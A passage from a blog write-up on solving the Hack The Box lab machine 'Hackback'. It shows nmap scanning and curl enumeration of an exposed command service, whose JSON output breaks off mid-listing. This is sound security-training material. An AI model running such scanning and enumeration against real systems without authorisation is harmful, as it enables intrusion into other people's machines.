<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Hackback - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Hackback"><a href="#Hack-The-Box-Hackback" class="headerlink" title="Hack The Box - Hackback"></a>Hack The Box - Hackback</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Hackback retired and here’s my write-up about it. Hackback was a very hard machine full of different steps and rabbit holes. It’s a Windows machine and its ip is <code>10.10.10.128</code>, I added it to <code>/etc/hosts</code> as <code>hackback.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/hackback/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services :<br><code>nmap -sV -sT -sC hackback.htb</code><br><img src="/images/hackthebox/hackback/1.png" alt=""><br>We got two <code>http</code> ports, 80 and 6666, I also ran a full scan but we’ll get to that later.</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>I checked both ports, on 80 there was this donkey image :<br><img src="/images/hackthebox/hackback/2.png" alt=""><br>I ran <code>gobuster</code> and it got nothing.<br>I couldn’t send a request to port 6666 from the browser so I used curl :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;hackback# curl http:&#x2F;&#x2F;hackback.htb:6666&#x2F; </span><br><span class="line">&quot;Missing Command!&quot;</span><br></pre></td></tr></table></figure>
<p>It says <code>&quot;Missing Command!&quot;</code><br>So I tried <code>/help</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;hackback# curl http:&#x2F;&#x2F;hackback.htb:6666&#x2F;help</span><br><span class="line">&quot;hello,proc,whoami,list,info,services,netsat,ipconfig&quot;</span><br></pre></td></tr></table></figure>
<p>It returned a list of what commands we can use. <code>/whoami</code> lists information about the user running this service, not really important. <code>/list</code> lists the files in the current directory :</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/list</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"Name"</span>:  <span class="string">"aspnet_client"</span>,</span><br><span class="line">        <span class="attr">"length"</span>:  <span class="literal">null</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"Name"</span>:  <span class="string">"default"</span>,</span><br><span class="line">        <span class="attr">"length"</span>:  <span class="literal">null</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"Name"</span>:  <span class="string">"new_phish"</span>,</span><br><span class="line">        <span class="attr">"length"</span>:  <span class="literal">null</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"Name"</span>:  <span class="string">"http.ps1"</span>,</span><br><span class="line">        <span class="attr">"Length"</span>:  <span class="number">1867</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"Name"</span>:  <span class="string">"iisstart.htm"</span>,</span><br><span class="line">        <span class="attr">"Length"</span>:  <span class="number">703</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"Name"</span>:  <span class="string">"iisstart.png"</span>,</span><br><span class="line">        <span class="attr">"Length"</span>:  <span class="number">99710</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p><code>/info</code> prints system information, we might need that :</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/info</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"WindowsBuildLabEx"</span>:  <span class="string">"17763.1.amd64fre.rs5_release.180914-1434"</span>,</span><br><span class="line">    <span class="attr">"WindowsCurrentVersion"</span>:  <span class="string">"6.3"</span>,</span><br><span class="line">    <span class="attr">"WindowsEditionId"</span>:  <span class="string">"ServerStandard"</span>,</span><br><span class="line">    <span class="attr">"WindowsInstallationType"</span>:  <span class="string">"Server"</span>,</span><br><span class="line">    <span class="attr">"WindowsInstallDateFromRegistry"</span>:  <span class="string">"\/Date(1542436874000)\/"</span>,</span><br><span class="line">    <span class="attr">"WindowsProductId"</span>:  <span class="string">"00429-00520-27817-AA520"</span>,</span><br><span class="line">    <span class="attr">"WindowsProductName"</span>:  <span class="string">"Windows Server 2019 Standard"</span>,</span><br><span class="line">    <span class="attr">"WindowsRegisteredOrganization"</span>:  <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"WindowsRegisteredOwner"</span>:  <span class="string">"Windows User"</span>,</span><br><span class="line">    <span class="attr">"WindowsSystemRoot"</span>:  <span class="string">"C:\\Windows"</span>,</span><br><span class="line">    <span class="attr">"WindowsVersion"</span>:  <span class="string">"1809"</span>,</span><br><span class="line">    <span class="attr">"BiosCharacteristics"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosBIOSVersion"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosBuildNumber"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosCaption"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosCodeSet"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosCurrentLanguage"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosDescription"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosEmbeddedControllerMajorVersion"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosEmbeddedControllerMinorVersion"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosFirmwareType"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosIdentificationCode"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosInstallableLanguages"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosInstallDate"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosLanguageEdition"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosListOfLanguages"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosManufacturer"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosName"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosOtherTargetOS"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosPrimaryBIOS"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosReleaseDate"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosSeralNumber"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosSMBIOSBIOSVersion"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosSMBIOSMajorVersion"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosSMBIOSMinorVersion"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosSMBIOSPresent"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosSoftwareElementState"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosStatus"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosSystemBiosMajorVersion"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosSystemBiosMinorVersion"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosTargetOperatingSystem"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"BiosVersion"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsAdminPasswordStatus"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsAutomaticManagedPagefile"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsAutomaticResetBootOption"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsAutomaticResetCapability"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsBootOptionOnLimit"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsBootOptionOnWatchDog"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsBootROMSupported"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsBootStatus"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsBootupState"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsCaption"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsChassisBootupState"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsChassisSKUNumber"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsCurrentTimeZone"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsDaylightInEffect"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsDescription"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsDNSHostName"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsDomain"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsDomainRole"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsEnableDaylightSavingsTime"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsFrontPanelResetStatus"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsHypervisorPresent"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsInfraredSupported"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsInitialLoadInfo"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsInstallDate"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsKeyboardPasswordStatus"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsLastLoadInfo"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsManufacturer"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsModel"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsName"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsNetworkAdapters"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsNetworkServerModeEnabled"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsNumberOfLogicalProcessors"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsNumberOfProcessors"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsProcessors"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsOEMStringArray"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsPartOfDomain"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsPauseAfterReset"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsPCSystemType"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsPCSystemTypeEx"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsPowerManagementCapabilities"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsPowerManagementSupported"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsPowerOnPasswordStatus"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsPowerState"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsPowerSupplyState"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsPrimaryOwnerContact"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsPrimaryOwnerName"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsResetCapability"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsResetCount"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsResetLimit"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsRoles"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsStatus"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsSupportContactDescription"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsSystemFamily"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsSystemSKUNumber"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsSystemType"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsThermalState"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsTotalPhysicalMemory"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsPhyicallyInstalledMemory"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsUserName"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsWakeUpType"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"CsWorkgroup"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsName"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsType"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsOperatingSystemSKU"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsVersion"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsCSDVersion"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsBuildNumber"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsHotFixes"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsBootDevice"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsSystemDevice"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsSystemDirectory"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsSystemDrive"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsWindowsDirectory"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsCountryCode"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsCurrentTimeZone"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsLocaleID"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsLocale"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsLocalDateTime"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsLastBootUpTime"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsUptime"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsBuildType"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsCodeSet"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsDataExecutionPreventionAvailable"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsDataExecutionPrevention32BitApplications"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsDataExecutionPreventionDrivers"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsDataExecutionPreventionSupportPolicy"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsDebug"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsDistributed"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsEncryptionLevel"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsForegroundApplicationBoost"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsTotalVisibleMemorySize"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsFreePhysicalMemory"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsTotalVirtualMemorySize"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsFreeVirtualMemory"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsInUseVirtualMemory"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsTotalSwapSpaceSize"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsSizeStoredInPagingFiles"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsFreeSpaceInPagingFiles"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsPagingFiles"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsHardwareAbstractionLayer"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsInstallDate"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsManufacturer"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span 